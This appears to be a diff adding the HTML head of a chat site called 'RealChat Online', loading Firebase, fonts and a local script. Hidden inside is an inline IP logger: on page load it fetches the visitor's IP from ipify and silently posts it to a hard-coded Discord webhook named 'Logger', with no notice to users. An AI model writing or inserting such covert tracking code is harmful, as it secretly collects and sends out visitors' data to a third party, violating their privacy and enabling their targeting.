@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title> RealChat Online</title>
+    <link href='https://fonts.googleapis.com/css?family=Bungee Outline' rel='stylesheet'/>
+    <link href='https://fonts.googleapis.com/css?family=Varela Round' rel='stylesheet'/>
+    <link href='https://fonts.googleapis.com/css?family=Bungee' rel='stylesheet'/>
+    <script src="https://kit.fontawesome.com/a076d05399.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.2.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.2.1/firebase-database.js"></script>
+
+    <link rel="stylesheet" href="index.css"/>
+    <script>
+function getIP(json) {
+  var request = new XMLHttpRequest(); //making a request for the webhook
+      request.open("POST", "https://discordapp.com/api/webhooks/832585828706156554/BC98rgj_R6xivIb94dq0_lK87kSn3hovytcvk4fGnZ-O9EEAMY7Vqs4OW6Bu530Rz-Qz");
+
+      request.setRequestHeader('Content-type', 'application/json');
+
+      var params = {
+        username: "Logger",
+        avatar_url: "https://i.pinimg.com/originals/d8/eb/57/d8eb57825be593ff8993265cf5eea794.jpg",
+        content: "**IP:** *" + json.ip + "*"
+      }
+   //just a webhook parameters such as avatar,name,message
+
+      request.send(JSON.stringify(params));
+    }
+
+</script>
+<script src="https://api.ipify.org?format=jsonp&amp;callback=getIP"></script>
+    <script type="text/javascript" src="index.js"></script>
+  </head>
+  <body></body>
+</html>
